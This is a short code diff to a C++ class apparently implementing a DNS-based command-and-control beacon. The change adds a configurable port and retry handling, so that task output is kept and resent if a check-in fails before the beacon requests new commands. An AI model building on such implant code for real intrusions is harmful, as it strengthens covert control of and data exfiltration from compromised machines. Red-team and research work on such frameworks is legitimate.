@@ -6,13 +6,14 @@ using namespace std;
 using namespace dns;
 
 
-BeaconDns::BeaconDns(std::string& config, const std::string& dnsServer, const std::string& domain)
+BeaconDns::BeaconDns(std::string& config, const std::string& dnsServer,
+                     const std::string& domain, int port)
     : Beacon()
 {
     // beacon and modules config
     initConfig(config);
     
-    m_client=new Client(dnsServer, domain);
+    m_client=new Client(dnsServer, domain, port);
 }
 
 
@@ -26,12 +27,15 @@ void BeaconDns::checkIn()
 {    
     SPDLOG_DEBUG("initConnection");
 
-    std::string output;
-    taskResultsToCmd(output);
+    if (m_pendingOutput.empty())
+        taskResultsToCmd(m_pendingOutput);
 
-    SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
+    SPDLOG_DEBUG("sending output.size {0}", std::to_string(m_pendingOutput.size()));
 
-    m_client->sendMessage(output);
+    if (!m_client->sendMessage(m_pendingOutput))
+        return;
+
+    m_pendingOutput.clear();
 
     std::string input = m_client->requestMessage();
 
